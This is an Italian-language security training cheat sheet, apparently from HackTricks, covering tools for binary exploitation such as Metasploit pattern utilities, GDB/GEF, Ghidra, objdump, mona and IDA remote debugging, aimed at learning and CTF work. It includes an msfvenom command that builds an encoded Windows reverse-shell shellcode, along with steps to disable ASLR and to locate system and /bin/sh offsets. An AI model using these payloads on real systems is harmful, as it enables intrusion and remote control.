# Strumenti di Sfruttamento

{{#include ../../../banners/hacktricks-training.md}}

## Metasploit
```bash
pattern_create.rb -l 3000   #Length
pattern_offset.rb -l 3000 -q 5f97d534   #Search offset
nasm_shell.rb
nasm> jmp esp   #Get opcodes
msfelfscan -j esi /opt/fusion/bin/level01
```
### Shellcodes
```bash
msfvenom /p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> [EXITFUNC=thread] [-e x86/shikata_ga_nai] -b "\x00\x0a\x0d" -f c
```
## GDB

### Installa
```bash
apt-get install gdb
```
### Parametri
```bash
-q # No show banner
-x <file> # Auto-execute GDB instructions from here
-p <pid> # Attach to process
```
### Istruzioni
```bash
run # Execute
start # Start and break in main
n/next/ni # Execute next instruction (no inside)
s/step/si # Execute next instruction
c/continue # Continue until next breakpoint
p system # Find the address of the system function
set $eip = 0x12345678 # Change value of $eip
help # Get help
quit # exit

# Disassemble
disassemble main # Disassemble the function called main
disassemble 0x12345678 # Disassemble taht address
set disassembly-flavor intel # Use intel syntax
set follow-fork-mode child/parent # Follow child/parent process

# Breakpoints
br func # Add breakpoint to function
br *func+23
br *0x12345678
del <NUM> # Delete that number of breakpoint
watch EXPRESSION # Break if the value changes

# info
info functions --> Info abount functions
info functions func --> Info of the funtion
info registers --> Value of the registers
bt # Backtrace Stack
bt full # Detailed stack
print variable
print 0x87654321 - 0x12345678 # Caculate

# x/examine
examine/<num><o/x/d/u/t/i/s/c><b/h/w/g> dir_mem/reg/puntero # Shows content of <num> in <octal/hexa/decimal/unsigned/bin/instruction/ascii/char> where each entry is a <Byte/half word (2B)/Word (4B)/Giant word (8B)>
x/o 0xDir_hex
x/2x $eip # 2Words from EIP
x/2x $eip -4 # $eip - 4
x/8xb $eip # 8 bytes (b-> byte, h-> 2bytes, w-> 4bytes, g-> 8bytes)
i r eip # Value of $eip
x/w pointer # Value of the pointer
x/s pointer # String pointed by the pointer
x/xw &pointer # Address where the pointer is located
x/i $eip # Instructions of the EIP
```
### [GEF](https://github.com/hugsy/gef)

Puoi utilizzare opzionalmente [**questo fork di GE**](https://github.com/bata24/gef)[**F**](https://github.com/bata24/gef) che contiene istruzioni più interessanti.
```bash
help memory # Get help on memory command
canary # Search for canary value in memory
checksec #Check protections
p system #Find system function address
search-pattern "/bin/sh" #Search in the process memory
vmmap #Get memory mappings
xinfo <addr> # Shows page, size, perms, memory area and offset of the addr in the page
memory watch 0x784000 0x1000 byte #Add a view always showinf this memory
got #Check got table
memory watch $_got()+0x18 5 #Watch a part of the got table

# Vulns detection
format-string-helper #Detect insecure format strings
heap-analysis-helper #Checks allocation and deallocations of memory chunks:NULL free, UAF,double free, heap overlap

#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp

#Shellcode
shellcode search x86 #Search shellcodes
shellcode get 61 #Download shellcode number 61

#Dump memory to file
dump binary memory /tmp/dump.bin 0x200000000 0x20000c350

#Another way to get the offset of to the RIP
1- Put a bp after the function that overwrites the RIP and send a ppatern to ovwerwrite it
2- ef➤  i f
Stack level 0, frame at 0x7fffffffddd0:
rip = 0x400cd3; saved rip = 0x6261617762616176
called by frame at 0x7fffffffddd8
Arglist at 0x7fffffffdcf8, args:
Locals at 0x7fffffffdcf8, Previous frame's sp is 0x7fffffffddd0
Saved registers:
rbp at 0x7fffffffddc0, rip at 0x7fffffffddc8
gef➤  pattern search 0x6261617762616176
[+] Searching for '0x6261617762616176'
[+] Found at offset 184 (little-endian search) likely
```
### Tricks

#### GDB stessi indirizzi

Durante il debug, GDB avrà **indirizzi leggermente diversi rispetto a quelli utilizzati dal binario quando eseguito.** Puoi far sì che GDB abbia gli stessi indirizzi eseguendo:

- `unset env LINES`
- `unset env COLUMNS`
- `set env _=<path>` _Inserisci il percorso assoluto del binario_
- Sfrutta il binario utilizzando la stessa rotta assoluta
- `PWD` e `OLDPWD` devono essere gli stessi quando si utilizza GDB e quando si sfrutta il binario

#### Backtrace per trovare le funzioni chiamate

Quando hai un **binario staticamente collegato**, tutte le funzioni apparterranno al binario (e non a librerie esterne). In questo caso sarà difficile **identificare il flusso che il binario segue per esempio per richiedere input all'utente.**\
Puoi facilmente identificare questo flusso **eseguendo** il binario con **gdb** fino a quando non ti viene chiesto di inserire un input. Poi, fermalo con **CTRL+C** e usa il comando **`bt`** (**backtrace**) per vedere le funzioni chiamate:
```
gef➤  bt
#0  0x00000000004498ae in ?? ()
#1  0x0000000000400b90 in ?? ()
#2  0x0000000000400c1d in ?? ()
#3  0x00000000004011a9 in ?? ()
#4  0x0000000000400a5a in ?? ()
```
### GDB server

`gdbserver --multi 0.0.0.0:23947` (in IDA devi riempire il percorso assoluto dell'eseguibile nella macchina Linux e nella macchina Windows)

## Ghidra

### Trova offset dello stack

**Ghidra** è molto utile per trovare l'**offset** per un **buffer overflow grazie alle informazioni sulla posizione delle variabili locali.**\
Ad esempio, nell'esempio qui sotto, un buffer flow in `local_bc` indica che hai bisogno di un offset di `0xbc`. Inoltre, se `local_10` è un canary cookie, indica che per sovrascriverlo da `local_bc` c'è un offset di `0xac`.\
_&#x52;emember che i primi 0x08 da dove viene salvato il RIP appartengono al RBP._

![](<../../../images/image (1061).png>)

## qtool
```bash
qltool run -v disasm --no-console --log-file disasm.txt --rootfs ./ ./prog
```
Get every opcode executed in the program.

## GCC

**gcc -fno-stack-protector -D_FORTIFY_SOURCE=0 -z norelro -z execstack 1.2.c -o 1.2** --> Compila senza protezioni\
**-o** --> Output\
**-g** --> Salva il codice (GDB sarà in grado di vederlo)\
**echo 0 > /proc/sys/kernel/randomize_va_space** --> Per disattivare l'ASLR in linux

**Per compilare un shellcode:**\
**nasm -f elf assembly.asm** --> restituisce un ".o"\
**ld assembly.o -o shellcodeout** --> Eseguibile

## Objdump

**-d** --> **Disassembla** sezioni eseguibili (vedi opcodes di un shellcode compilato, trova ROP Gadgets, trova indirizzo della funzione...)\
**-Mintel** --> Sintassi **Intel**\
**-t** --> Tabella dei **Simboli**\
**-D** --> **Disassembla tutto** (indirizzo di variabile statica)\
**-s -j .dtors** --> sezione dtors\
**-s -j .got** --> sezione got\
-D -s -j .plt --> sezione **plt** **decompilata**\
**-TR** --> **Ridenominazioni**\
**ojdump -t --dynamic-relo ./exec | grep puts** --> Indirizzo di "puts" da modificare in GOT\
**objdump -D ./exec | grep "VAR_NAME"** --> Indirizzo di una variabile statica (queste sono memorizzate nella sezione DATA).

## Core dumps

1. Esegui `ulimit -c unlimited` prima di avviare il mio programma
2. Esegui `sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t`
3. sudo gdb --core=\<path/core> --quiet

## More

**ldd executable | grep libc.so.6** --> Indirizzo (se ASLR, allora questo cambia ogni volta)\
**for i in \`seq 0 20\`; do ldd \<Ejecutable> | grep libc; done** --> Ciclo per vedere se l'indirizzo cambia molto\
**readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system** --> Offset di "system"\
**strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh** --> Offset di "/bin/sh"

**strace executable** --> Funzioni chiamate dall'eseguibile\
**rabin2 -i ejecutable -->** Indirizzo di tutte le funzioni

## **Inmunity debugger**
```bash
!mona modules    #Get protections, look for all false except last one (Dll of SO)
!mona find -s "\xff\xe4" -m name_unsecure.dll   #Search for opcodes insie dll space (JMP ESP)
```
## IDA

### Debugging in remote linux

All'interno della cartella IDA puoi trovare binari che possono essere utilizzati per eseguire il debug di un binario all'interno di un linux. Per farlo, sposta il binario `linux_server` o `linux_server64` all'interno del server linux ed eseguilo nella cartella che contiene il binario:
```
./linux_server64 -Ppass
```
Quindi, configura il debugger: Debugger (linux remote) --> Opzioni di processo...:

![](<../../../images/image (858).png>)

{{#include ../../../banners/hacktricks-training.md}}
